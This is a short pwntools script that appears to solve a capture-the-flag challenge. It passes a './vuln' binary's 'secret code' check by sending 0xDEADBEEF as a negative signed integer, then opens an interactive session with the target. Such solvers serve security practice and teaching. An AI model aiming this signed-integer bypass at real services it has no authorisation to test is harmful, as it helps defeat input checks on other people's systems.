#!/usr/bin/env python3
from pwn import *


TARGET = 0xDEADBEEF
SIGNED_TARGET = -(0x100000000 - TARGET)


def start():
    if args.REMOTE:
        host = args.HOST or "localhost"
        port = int(args.PORT or 31337)
        return remote(host, port)
    return process("./vuln")


def main():
    io = start()
    io.sendlineafter(b"What is your name? ", b"solver")
    io.sendlineafter(b"Enter the secret code: ", str(SIGNED_TARGET).encode())
    io.interactive()


if __name__ == "__main__":
    main()
